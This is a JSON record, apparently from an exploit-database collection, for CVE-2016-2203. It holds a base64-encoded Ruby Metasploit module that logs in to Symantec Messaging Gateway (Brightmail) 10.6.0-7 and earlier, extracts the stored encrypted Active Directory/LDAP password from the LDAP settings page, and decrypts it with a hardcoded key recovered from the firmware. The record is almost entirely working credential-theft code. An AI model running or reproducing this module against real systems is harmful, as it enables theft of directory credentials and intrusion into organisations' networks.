{
    "source": "exploit-database", 
    "exploit": "IyBFeHBsb2l0IFRpdGxlOiBTeW1hbnRlYyBCcmlnaHRtYWlsIGxkYXAgY3JlZGVudGlhbCBHcmFiYmVyIA0KIyBEYXRlOiAxOC8wNC8yMDE2DQojIEV4cGxvaXQgQXV0aG9yOiBGYWtoaXIgS2FyaW0gUmVkYQ0KIyBWZW5kb3IgSG9tZXBhZ2U6IGh0dHBzOi8vd3d3LnN5bWFudGVjLmNvbS9zZWN1cml0eV9yZXNwb25zZS9zZWN1cml0eXVwZGF0ZXMvZGV0YWlsLmpzcD9maWQ9c2VjdXJpdHlfYWR2aXNvcnkmcHZpZD1zZWN1cml0eV9hZHZpc29yeSZ5ZWFyJnN1aWQ9MjAxNjA0MThfMDANCiMgVmVyc2lvbjogMTAuNi4wLTcgYW5kIGVhcmxpZXINCiMgVGVzdGVkIG9uOiBMaW51eCwgVW5veCBXaW5kb3dzIA0KIyBDVkUgOiBDVkUtMjAxNi0yMjAzDQoNCg0KI1N5bWFudGVjIEJyaWdodG1haWwgMTAuNi4wLTcgYW5kIGVhcmxpZXIgc2F2ZSB0aGUgQUQgcGFzc3dvcmQgc29tZXdoZXJlIGluIHRoZSBwcm9kdWN0LiBCeSBoYXZpbmcgYSByZWFkIGFjY291bnQgb24gdGhlIGdhdGV3YXkgIHdlIGNhbiByZWNvdmVyIHRoZSBBRCAjQUNPVU5UL1BBU1NXT1JEICANCg0KI2luZGVlZCB0aGUgaHRtbCBjb2RlIGNvbnRhaW5zIHRoZSBlbmNyeXB0ZWQgQUQgcGFzc3dvcmQuDQoNCiN0aGUgZW5jcnlwdGlvbiBhbmQgZGVjcnlwdGlvbiBwYXJ0IGlzIGltcGxlbWVudGVkIGluIEphdmEgaW4gdGhlIGFwcGxpYW5jZSwgYnkgcmV2ZXJzaW5nIHRoZSBjb2RlIHdlIGdldCB0byBrbm93IHRoZSBlbmNyeXB0aW9uIGFsZ29yaXRobToNCg0KI3B1YmxpYyBzdGF0aWMgU3RyaW5nIGRlY3J5cHQoU3RyaW5nIHBhc3N3b3JkKQ0KI3sNCiNieXRlIGNsZWFyVGV4dFtdOw0KI3RyeXsNCiNQQkVLZXlTcGVjIGtleVNwZWMgPSBuZXcgUEJFS2V5U3BlYygiYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWiwuLzw+PzsnOlwie31gfiFAIyQlXiYqKClfKy09Ii50b0NoYXJBcnJheSgpKTsNCiNTZWNyZXRLZXlGYWN0b3J5IGtleUZhY3RvcnkgPSBTZWNyZXRLZXlGYWN0b3J5LmdldEluc3RhbmNlKCJQQkVXaXRoTUQ1QW5kREVTIik7DQojU2VjcmV0S2V5IHNlY3JldEtleSA9IGtleUZhY3RvcnkuZ2VuZXJhdGVTZWNyZXQoa2V5U3BlYyk7DQojU3lzdGVtLm91dC5wcmludGxuKCJFbmNvZGVkIGtleSAiKyAobmV3IFN0cmluZyhzZWNyZXRLZXkuZ2V0RW5jb2RlZCgpKSkpOw0KDQoNCiMjDQojIFRoaXMgbW9kdWxlIHJlcXVpcmVzIE1ldGFzcGxvaXQ6IGh0dHA6Ly9tZXRhc3Bsb2l0LmNvbS9kb3dubG9hZA0KIyBDdXJyZW50IHNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yaw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQpyZXF1aXJlICJiYXNlNjQiDQpyZXF1aXJlICdkaWdlc3QnDQpyZXF1aXJlICJvcGVuc3NsIg0KDQoNCmNsYXNzIE1ldGFzcGxvaXRNb2R1bGUgPCBNc2Y6OkF1eGlsaWFyeQ0KDQogIGluY2x1ZGUgTXNmOjpBdXhpbGlhcnk6OlNjYW5uZXINCiAgaW5jbHVkZSBNc2Y6OkF1eGlsaWFyeTo6UmVwb3J0DQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvID0ge30pDQogICAgc3VwZXIodXBkYXRlX2luZm8oaW5mbywNCiAgICAgICdOYW1lJyAgICAgICAgICAgPT4gJ1N5bWFudGVjIE1lc3NhZ2luZyBHYXRld2F5IDEwIExEQVAgQ3JlZHMgR3JhYmVyJywNCiAgICAgICdEZXNjcmlwdGlvbicgICAgPT4gJXF7DQogICAgICAgICAgVGhpcyBtb2R1bGUgd2lsbCAgZ3JhYiB0aGUgQUQgYWNjb3VudCBzYXZlZCBpbiBTeW1hbnRlYyBNZXNzYWdpbmcgR2F0ZXdheSBhbmQgdGhlbiBkZWNpcGhlciBpdCB1c2luZyB0aGUgZGlzY2xvc2VkIHN5bWFudGVjIHBiZSBrZXkuICBOb3RlIHRoYXQgYXV0aGVudGljYXRpb24gaXMgcmVxdWlyZWQgaW4gb3JkZXIgdG8gc3VjY2Vzc2Z1bGx5IGdyYWIgdGhlIExEQVAgY3JlZGVudGlhbHMsIHlvdSBuZWVkIGF0IGxlYXN0IGEgcmVhZCBhY2NvdW50LiBWZXJzaW9uIDEwLjYuMC03IGFuZCBlYXJsaWVyIGFyZSBhZmZlY3RlZA0KDQogICAgICB9LA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydVUkwnLCdodHRwczovL3d3dy5zeW1hbnRlYy5jb20vc2VjdXJpdHlfcmVzcG9uc2Uvc2VjdXJpdHl1cGRhdGVzL2RldGFpbC5qc3A/ZmlkPXNlY3VyaXR5X2Fkdmlzb3J5JnB2aWQ9c2VjdXJpdHlfYWR2aXNvcnkmeWVhcj0mc3VpZD0yMDE2MDQxOF8wMCddLA0KICAgICAgICAgIFsnQ1ZFJywnMjAxNi0yMjAzJ10sDQogICAgICAgICAgWydCSUQnLCc4NjEzNyddDQogICAgICAgIF0sDQoNCiAgICAgICdBdXRob3InICAgICAgICAgPT4NCiAgICAgICAgWw0KICAgICAgICAgICdGYWtoaXIgS2FyaW0gUmVkYSA8a2FyaW0uZmFraGlyW2F0XWdtYWlsLmNvbT4nDQogICAgICAgIF0sDQogICAgICAgJ0RlZmF1bHRPcHRpb25zJyA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1NTTCcgPT4gdHJ1ZSwNCiAgICAgICAgICAnU1NMVmVyc2lvbicgPT4gJ1RMUzEnLA0KICAgICAgICAgICdSUE9SVCcgPT4gNDQzDQogICAgICAgIH0sDQogICAgICAgJ0xpY2Vuc2UnICAgICAgICA9PiBNU0ZfTElDRU5TRSwNCiAgICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICJEZWMgMTcgMjAxNSINCiAgICApKQ0KICAgIHJlZ2lzdGVyX29wdGlvbnMoDQogICAgICBbDQogICAgICAgIE9wdEludC5uZXcoJ1RJTUVPVVQnLCBbdHJ1ZSwgJ0hUVFBTIGNvbm5lY3QvcmVhZCB0aW1lb3V0IGluIHNlY29uZHMnLCAxXSksDQogICAgICAgIE9wdDo6UlBPUlQoNDQzKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVVNFUk5BTUUnLCBbdHJ1ZSwgJ1RoZSB1c2VybmFtZSB0byBsb2dpbiBhcyddKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnUEFTU1dPUkQnLCBbdHJ1ZSwgJ1RoZSBwYXNzd29yZCB0byBsb2dpbiB3aXRoJ10pDQogICAgICBdLCBzZWxmLmNsYXNzKQ0KICAgIGRlcmVnaXN0ZXJfb3B0aW9ucygnUkhPU1QnKQ0KICBlbmQNCg0KDQogIGRlZiBwcmludF9zdGF0dXMobXNnPScnKQ0KICAgIHN1cGVyKCIje3BlZXJ9IC0gI3ttc2d9IikNCiAgZW5kDQoNCiAgZGVmIHByaW50X2dvb2QobXNnPScnKQ0KICAgIHN1cGVyKCIje3BlZXJ9IC0gI3ttc2d9IikNCiAgZW5kDQoNCiAgZGVmIHByaW50X2Vycm9yKG1zZz0nJykNCiAgICBzdXBlcigiI3twZWVyfSAtICN7bXNnfSIpDQogIGVuZA0KDQogIGRlZiByZXBvcnRfY3JlZChvcHRzKQ0KICAgc2VydmljZV9kYXRhID0gew0KICAgIGFkZHJlc3M6IG9wdHNbOmlwXSwNCiAgICBwb3J0OiBvcHRzWzpwb3J0XSwNCiAgICBzZXJ2aWNlX25hbWU6ICdMREFQJywNCiAgICBwcm90b2NvbDogJ3RjcCcsDQogICAgd29ya3NwYWNlX2lkOiBteXdvcmtzcGFjZV9pZA0KICAgfQ0KICAgY3JlZGVudGlhbF9kYXRhID0gew0KICAgIG9yaWdpbl90eXBlOiA6c2VydmljZSwNCiAgICBtb2R1bGVfZnVsbG5hbWU6IGZ1bGxuYW1lLA0KICAgIHVzZXJuYW1lOiBvcHRzWzp1c2VyXSwNCiAgICBwcml2YXRlX2RhdGE6IG9wdHNbOnBhc3N3b3JkXSwNCiAgICBwcml2YXRlX3R5cGU6IDpwYXNzd29yZA0KICAgfS5tZXJnZShzZXJ2aWNlX2RhdGEpDQogICBsb2dpbl9kYXRhID0gew0KICAgIGxhc3RfYXR0ZW1wdGVkX2F0OiBEYXRlVGltZS5ub3csDQogICAgY29yZTogY3JlYXRlX2NyZWRlbnRpYWwoY3JlZGVudGlhbF9kYXRhKSwNCiAgICBzdGF0dXM6IE1ldGFzcGxvaXQ6Ok1vZGVsOjpMb2dpbjo6U3RhdHVzOjpTVUNDRVNTRlVMLA0KICAgIHByb29mOiBvcHRzWzpwcm9vZl0NCiAgIH0ubWVyZ2Uoc2VydmljZV9kYXRhKQ0KDQogICBjcmVhdGVfY3JlZGVudGlhbF9sb2dpbihsb2dpbl9kYXRhKQ0KICBlbmQNCg0KICBkZWYgYXV0aCh1c2VybmFtZSwgcGFzc3dvcmQsIHNpZCwgbGFzdF9sb2dpbikNCiAgICAjIFJlYWwgSlNFU1NJT05JRCAgY29va2llDQogICAgc2lkMiA9ICcnDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAnbWV0aG9kJyAgICA9PiAnUE9TVCcsDQogICAgICAndXJpJyAgICAgICA9PiAnL2JyaWdodG1haWwvbG9naW4uZG8nLA0KICAgICAgJ2hlYWRlcnMnICAgPT4gew0KICAgICAgICAnUmVmZXJlcicgPT4gImh0dHBzOi8vI3twZWVyfS9icmlnaHRtYWlsL3ZpZXdMb2dpbi5kbyIsDQogICAgICAgICdDb25uZWN0aW9uJyA9PiAna2VlcC1hbGl2ZScNCiAgICAgIH0sDQogICAgICAnY29va2llJyAgICA9PiAidXNlckxhbmd1YWdlQ29kZT1lbjsgdXNlckNvdW50cnlDb2RlPVVTOyBKU0VTU0lPTklEPSN7c2lkfSIsDQogICAgICAndmFyc19wb3N0JyA9PiB7DQogICAgICAgICdsYXN0bG9naW4nICA9PiBsYXN0X2xvZ2luLA0KICAgICAgICAndXNlckxvY2FsZScgPT4gJycsDQogICAgICAgICdsYW5nJyAgICAgICA9PiAnZW5fVVMnLA0KICAgICAgICAndXNlcm5hbWUnICAgPT4gdXNlcm5hbWUsDQogICAgICAgICdwYXNzd29yZCcgICA9PiBwYXNzd29yZCwNCiAgICAgICAgJ2xvZ2luQnRuJyAgID0+ICdMb2dpbicNCiAgICAgIH0NCiAgICB9KQ0KICAgaWYgcmVzLmJvZHkgPX4gL0xvZ2dlZCBpbi8NCiAgICAgIHNpZDIgPSByZXMuZ2V0X2Nvb2tpZXMuc2NhbigvSlNFU1NJT05JRD0oW2EtekEtWjAtOV0rKS8pLmZsYXR0ZW5bMF0gfHwgJycNCiAgICAgIHJldHVybiBzaWQyDQogICBlbmQNCiAgIGlmIHJlcyBhbmQgcmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10NCiAgICAgbWxvY2F0aW9uID0gcmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10NCiAgICAgbmV3X3VyaSA9IHJlcy5oZWFkZXJzWydMb2NhdGlvbiddLnNjYW4oL15odHRwOlwvXC9bXGRcLl0rOlxkKyhcLy4rKS8pLmZsYXR0ZW5bMF0NCiAgICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAgICd1cmknICAgID0+IG5ld191cmksDQogICAgICAgICdjb29raWUnID0+ICJ1c2VyTGFuZ3VhZ2VDb2RlPWVuOyB1c2VyQ291bnRyeUNvZGU9VVM7IEpTRVNTSU9OSUQ9I3tzaWR9Ig0KICAgICB9KQ0KICAgICBzaWQyID0gcmVzLmdldF9jb29raWVzLnNjYW4oL0pTRVNTSU9OSUQ9KFthLXpBLVowLTldKykvKS5mbGF0dGVuWzBdIHx8ICcnDQogICAgIHJldHVybiBzaWQyICBpZiByZXMgYW5kIHJlcy5ib2R5ID1+IC9Mb2dnZWQgaW4vDQogICBlbmQNCiAgIHJldHVybiBmYWxzZQ0KICBlbmQNCg0KICBkZWYgZ2V0X2xvZ2luX2RhdGENCiAgICBzaWQgICAgICAgID0gJycgICNGcm9tIGNvb2tpZQ0KICAgIGxhc3RfbG9naW4gPSAnJyAgI0EgaGlkZGVuIGZpZWxkIGluIHRoZSBsb2dpbiBwYWdlDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X3Jhdyh7J3VyaSc9PicvYnJpZ2h0bWFpbC92aWV3TG9naW4uZG8nfSkNCiAgICBpZiByZXMgYW5kICFyZXMuZ2V0X2Nvb2tpZXMuZW1wdHk/DQogICAgICBzaWQgPSByZXMuZ2V0X2Nvb2tpZXMuc2NhbigvSlNFU1NJT05JRD0oW2EtekEtWjAtOV0rKS8pLmZsYXR0ZW5bMF0gfHwgJycNCiAgICBlbmQNCiAgICBpZiByZXMNCiAgICAgIGxhc3RfbG9naW4gPSByZXMuYm9keS5zY2FuKC88aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJsYXN0bG9naW4iIHZhbHVlPSIoLispIlwvPi8pLmZsYXR0ZW5bMF0gfHwgJycNCiAgICBlbmQNCiAgICByZXR1cm4gc2lkLCBsYXN0X2xvZ2luDQogIGVuZA0KDQogICMgUmV0dXJucyB0aGUgc3RhdHVzIG9mIHRoZSBsaXN0ZW5pbmcgcG9ydC4NCiAgIw0KICAjIEByZXR1cm4gW0Jvb2xlYW5dIFRydWVDbGFzcyBpZiBwb3J0IG9wZW4sIG90aGVyd2lzZSBGYWxzZUNsYXNzLg0KDQogIGRlZiBwb3J0X29wZW4/DQogICAgYmVnaW4NCiAgICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9yYXcoeydtZXRob2QnID0+ICdHRVQnLCAndXJpJyA9PiAnLyd9LCBkYXRhc3RvcmVbJ1RJTUVPVVQnXSkNCiAgICAgIHJldHVybiB0cnVlIGlmIHJlcw0KICAgIHJlc2N1ZSA6OlJleDo6Q29ubmVjdGlvblJlZnVzZWQNCiAgICAgIHByaW50X3N0YXR1cygiI3twZWVyfSAtIENvbm5lY3Rpb24gcmVmdXNlZCIpDQogICAgICByZXR1cm4gZmFsc2UNCiAgICByZXNjdWUgOjpSZXg6OkNvbm5lY3Rpb25FcnJvcg0KICAgICAgcHJpbnRfZXJyb3IoIiN7cGVlcn0gLSBDb25uZWN0aW9uIGZhaWxlZCIpDQogICAgICByZXR1cm4gZmFsc2UNCiAgICByZXNjdWUgOjpPcGVuU1NMOjpTU0w6OlNTTEVycm9yDQogICAgICBwcmludF9lcnJvcigiI3twZWVyfSAtIFNTTC9UTFMgY29ubmVjdGlvbiBlcnJvciIpDQogICAgICByZXR1cm4gZmFsc2UNCiAgICBlbmQNCiAgZW5kDQoNCiAgIyBSZXR1cm5zIHRoZSBkZXJpdmVkIGtleSBmcm9tIHRoZSBwYXNzd29yZCwgdGhlIHNhbHQgYW5kIHRoZSBpdGVyYXRpb24gY291bnQgbnVtYmVyLg0KICAjDQogICMgQHJldHVybiBBcnJheSBvZiBieXRlIGNvbnRhaW5pbmcgdGhlIGRlcml2ZWQga2V5Lg0KICBkZWYgZ2V0X2Rlcml2ZWRfa2V5KHBhc3N3b3JkLCBzYWx0LCBjb3VudCkNCiAgICBrZXkgPSBwYXNzd29yZCArIHNhbHQNCiAgICBmb3IgaSBpbiAwLi5jb3VudC0xDQogICAgICAgIGtleSA9IERpZ2VzdDo6TUQ1LmRpZ2VzdChrZXkpDQogICAgZW5kDQogICAga2wgPSBrZXkubGVuZ3RoDQogICAgcmV0dXJuIGtleVswLDhdLCBrZXlbOCxrbF0NCiAgZW5kDQoNCg0KICAjIEBSZXR1cm4gdGhlIGRlY2lwaGVyZWQgcGFzc3dvcmQNCiAgIyBBbGdvcml0aG0gb2J0YWluZWQgYnkgcmV2ZXJzaW5nIHRoZSBmaXJtd2FyZQ0KICAjDQogIGRlZiBkZWNyeXB0KGVuY19zdHIpDQogICAgcGJlX2tleT0iYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXpBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWiwuLzw+PzsnOlwiXFx7fWB+IUAjJCVeJiooKV8rLT0iDQogICAgc2FsdCA9IChCYXNlNjQuc3RyaWN0X2RlY29kZTY0KGVuY19zdHJbMCwxMl0pKQ0KICAgIHJlbXNnID0gKEJhc2U2NC5zdHJpY3RfZGVjb2RlNjQoZW5jX3N0clsxMixlbmNfc3RyLmxlbmd0aF0pKQ0KICAgIChkaywgaXYpID0gZ2V0X2Rlcml2ZWRfa2V5KHBiZV9rZXksIHNhbHQsIDEwMDApDQogICAgYWxnID0gImRlcy1jYmMiDQogICAgZGVjb2RlX2NpcGhlciA9IE9wZW5TU0w6OkNpcGhlcjo6Q2lwaGVyLm5ldyhhbGcpDQogICAgZGVjb2RlX2NpcGhlci5kZWNyeXB0DQogICAgZGVjb2RlX2NpcGhlci5wYWRkaW5nID0gMA0KICAgIGRlY29kZV9jaXBoZXIua2V5ID0gZGsNCiAgICBkZWNvZGVfY2lwaGVyLml2ID0gaXYNCiAgICBwbGFpbiA9IGRlY29kZV9jaXBoZXIudXBkYXRlKHJlbXNnKQ0KICAgIHBsYWluIDw8IGRlY29kZV9jaXBoZXIuZmluYWwNCiAgICByZXR1cm4gIHBsYWluLmdzdWIoL1tceDAxLVx4MDhdLywnJykNCiAgZW5kDQoNCiBkZWYgZ3JhYl9hdXRocyhzaWQsbGFzdF9sb2dpbikNCiAgdG9rZW4gPSAnJyAjZnJvbSBoaWRkZW4gaW5wdXQNCiAgc2VsZWN0ZWRfbGRhcCA9ICcnICMgZnJvbSBjaGVja2JveCBpbnB1dA0KICBuZXdfdXJpID0gJycgIyByZWRpcmVjdGlvbg0KICBmbG93X2lkID0gJycgIyBpZCBvZiB0aGUgZmxvdw0KICBmb2xkZXIgPSAnJyAjIHN5bWFudGVjIGZvbGRlcg0KICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCiAgICdtZXRob2QnICAgID0+ICdHRVQnLA0KICAgJ3VyaScgICAgICAgPT4gIi9icmlnaHRtYWlsL3NldHRpbmcvbGRhcC9MZGFwV2l6YXJkRmxvdyRleGVjLmZsbyIsDQogICAnaGVhZGVycycgICA9PiB7DQogICAgJ1JlZmVyZXInID0+ICJodHRwczovLyN7cGVlcn0vYnJpZ2h0bWFpbC9zZXR0aW5nL2xkYXAvTGRhcFdpemFyZEZsb3ckZXhlYy5mbG8iLA0KICAgICdDb25uZWN0aW9uJyA9PiAna2VlcC1hbGl2ZScNCiAgIH0sDQogICAnY29va2llJyAgICA9PiAidXNlckxhbmd1YWdlQ29kZT1lbjsgdXNlckNvdW50cnlDb2RlPVVTOyBKU0VTU0lPTklEPSN7c2lkfTsiDQogICB9KQ0KICAgaWYgcmVzDQogICAgdG9rZW4gPSByZXMuYm9keS5zY2FuKC88aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJzeW1hbnRlYy5icmlnaHRtYWlsLmtleS5UT0tFTiIgdmFsdWU9IiguKykiXC8+LykuZmxhdHRlblswXSB8fCAnJw0KICAgIHNlbGVjdGVkX2xkYXAgPSByZXMuYm9keS5zY2FuKC88aW5wdXQgdHlwZT0iY2hlY2tib3giIHZhbHVlPSIoLispIiBuYW1lPSJzZWxlY3RlZExEQVAiLitcLz4vKS5mbGF0dGVuWzBdIHx8ICcnDQogICBlbHNlDQogICAgcmV0dXJuIGZhbHNlDQogICBlbmQNCiAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KICAgICdtZXRob2QnICAgID0+ICdQT1NUJywNCiAgICAndXJpJyAgICAgICA9PiAiL2JyaWdodG1haWwvc2V0dGluZy9sZGFwL0xkYXBXaXphcmRGbG93JGVkaXQuZmxvIiwNCiAgICAnaGVhZGVycycgICA9PiB7DQogICAgICdSZWZlcmVyJyA9PiAiaHR0cHM6Ly8je3BlZXJ9L2JyaWdodG1haWwvc2V0dGluZy9sZGFwL0xkYXBXaXphcmRGbG93JGV4ZWMuZmxvIiwNCiAgICAgJ0Nvbm5lY3Rpb24nID0+ICdrZWVwLWFsaXZlJw0KICAgIH0sDQogICAgJ2Nvb2tpZScgICAgPT4gInVzZXJMYW5ndWFnZUNvZGU9ZW47IHVzZXJDb3VudHJ5Q29kZT1VUzsgSlNFU1NJT05JRD0je3NpZH07ICIsDQogICAgJ3ZhcnNfcG9zdCcgID0+IHsNCiAgICAgJ2Zsb3dJZCcgID0+ICcwJywNCiAgICAgJ3VzZXJMb2NhbGUnID0+ICcnLA0KICAgICAnbGFuZycgICAgICAgPT4gJ2VuX1VTJywNCiAgICAgJ3N5bWFudGVjLmJyaWdodG1haWwua2V5LlRPS0VOJz0+ICIje3Rva2VufSIsDQogICAgICdzZWxlY3RlZExEQVAnID0+ICIje3NlbGVjdGVkX2xkYXB9Ig0KICAgIH0NCiAgIH0pDQogICBpZiByZXMgYW5kIHJlcy5oZWFkZXJzWydMb2NhdGlvbiddDQogICAgbWxvY2F0aW9uID0gcmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10NCiAgICBuZXdfdXJpID0gcmVzLmhlYWRlcnNbJ0xvY2F0aW9uJ10uc2NhbigvXmh0dHBzOlwvXC9bXGRcLl0rKFwvLispLykuZmxhdHRlblswXQ0KICAgIGZsb3dfaWQgPSAgbmV3X3VyaS5zY2FuKC8uKlw/Zmxvd0lkPSguKykvKS5mbGF0dGVuWzBdDQogICAgZm9sZGVyID0gbmV3X3VyaS5zY2FuKC8oLiopXD9mbG93SWQ9LiovKS5mbGF0dGVuWzBdDQogICBlbHNlDQogICAgcmV0dXJuIGZhbHNlDQogICBlbmQNCiAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KICAgICdtZXRob2QnICAgID0+ICdHRVQnLA0KICAgICd1cmknICAgICAgID0+ICIje2ZvbGRlcn0iLA0KICAgICdoZWFkZXJzJyAgID0+IHsNCiAgICAgJ1JlZmVyZXInID0+ICJodHRwczovLyN7cGVlcn0vYnJpZ2h0bWFpbC9zZXR0aW5nL2xkYXAvTGRhcFdpemFyZEZsb3ckZXhlYy5mbG8iLA0KICAgICAnQ29ubmVjdGlvbicgPT4gJ2tlZXAtYWxpdmUnDQogICAgfSwNCiAgICAnY29va2llJyAgICA9PiAidXNlckxhbmd1YWdlQ29kZT1lbjsgdXNlckNvdW50cnlDb2RlPVVTOyBKU0VTU0lPTklEPSN7c2lkfTsgIiwNCiAgICAndmFyc19nZXQnICA9PiB7DQogICAgICdmbG93SWQnICA9PiAiI3tmbG93X2lkfSIsDQogICAgICd1c2VyTG9jYWxlJyA9PiAnJywNCiAgICAgJ2xhbmcnICAgICAgID0+ICdlbl9VUycNCiAgICB9DQogICB9KQ0KICAgaWYgcmVzIGFuZCByZXMuY29kZSA9PSAyMDANCiAgICBsb2dpbiA9IHJlcy5ib2R5LnNjYW4oLzxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJ1c2VyTmFtZSIuKnZhbHVlPSIoLispIlwvPi8pLmZsYXR0ZW5bMF0gfHwgJycNCiAgICBwYXNzd29yZCA9IHJlcy5ib2R5LnNjYW4oLzxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0icGFzc3dvcmQiLip2YWx1ZT0iKC4rKSJcLz4vKS5mbGF0dGVuWzBdIHx8ICcnDQogICAgaG9zdCA9ICByZXMuYm9keS5zY2FuKC88aW5wdXQgbmFtZT0iaG9zdCIgaWQ9Imhvc3QiIHR5cGU9InRleHQiIHZhbHVlPSIoLispIiBjbGFzcy8pLmZsYXR0ZW5bMF0gfHwgJycNCiAgICBwb3J0ID0gIHJlcy5ib2R5LnNjYW4oLzxpbnB1dCBuYW1lPSJwb3J0IiBpZD0icG9ydCIgdHlwZT0idGV4dCIgdmFsdWU9IiguKykiIGNsYXNzLykuZmxhdHRlblswXSB8fCAnJw0KICAgIHBhc3N3b3JkID0gZGVjcnlwdChwYXNzd29yZCkNCiAgICBwcmludF9nb29kKCJGb3VuZCBsb2dpbiA9ICcje2xvZ2lufScgcGFzc3dvcmQgPSAnI3twYXNzd29yZH0nIGhvc3QgPScje2hvc3R9JyBwb3J0ID0gJyN7cG9ydH0nICIpDQogICAgcmVwb3J0X2NyZWQoaXA6IGhvc3QsIHBvcnQ6IHBvcnQsIHVzZXI6bG9naW4sIHBhc3N3b3JkOiBwYXNzd29yZCwgcHJvb2Y6IHJlcy5jb2RlLnRvX3MpDQogICBlbmQNCiAgZW5kDQoNCiAgZGVmIHJ1bl9ob3N0KGlwKQ0KICAgIHJldHVybiB1bmxlc3MgcG9ydF9vcGVuPw0KICAgIHNpZCwgbGFzdF9sb2dpbiA9IGdldF9sb2dpbl9kYXRhDQogICAgaWYgc2lkLmVtcHR5PyBvciBsYXN0X2xvZ2luLmVtcHR5Pw0KICAgICAgcHJpbnRfZXJyb3IoIiN7cGVlcn0gLSBNaXNzaW5nIHJlcXVpcmVkIGxvZ2luIGRhdGEuICBDYW5ub3QgY29udGludWUuIikNCiAgICAgIHJldHVybg0KICAgIGVuZA0KICAgIHVzZXJuYW1lID0gZGF0YXN0b3JlWydVU0VSTkFNRSddDQogICAgcGFzc3dvcmQgPSBkYXRhc3RvcmVbJ1BBU1NXT1JEJ10NCiAgICBzaWQgPSBhdXRoKHVzZXJuYW1lLCBwYXNzd29yZCwgc2lkLCBsYXN0X2xvZ2luKQ0KICAgIGlmIG5vdCBzaWQNCiAgICAgIHByaW50X2Vycm9yKCIje3BlZXJ9IC0gVW5hYmxlIHRvIGxvZ2luLiAgQ2Fubm90IGNvbnRpbnVlLiIpDQogICAgICByZXR1cm4NCiAgICBlbHNlDQogICAgICBwcmludF9nb29kKCIje3BlZXJ9IC0gTG9nZ2VkIGluIGFzICcje3VzZXJuYW1lfToje3Bhc3N3b3JkfScgU2lkOiAnI3tzaWR9JyBMYXN0TG9naW4gJyN7bGFzdF9sb2dpbn0nIikNCiAgICBlICAgbmQNCiAgICBncmFiX2F1dGhzKHNpZCxsYXN0X2xvZ2luKQ0KICBlbmQNCmVuZA==", 
    "filename": "platforms/java/webapps/39715.rb", 
    "id": "39715", 
    "cves": [
        "CVE-2016-2203"
    ]
}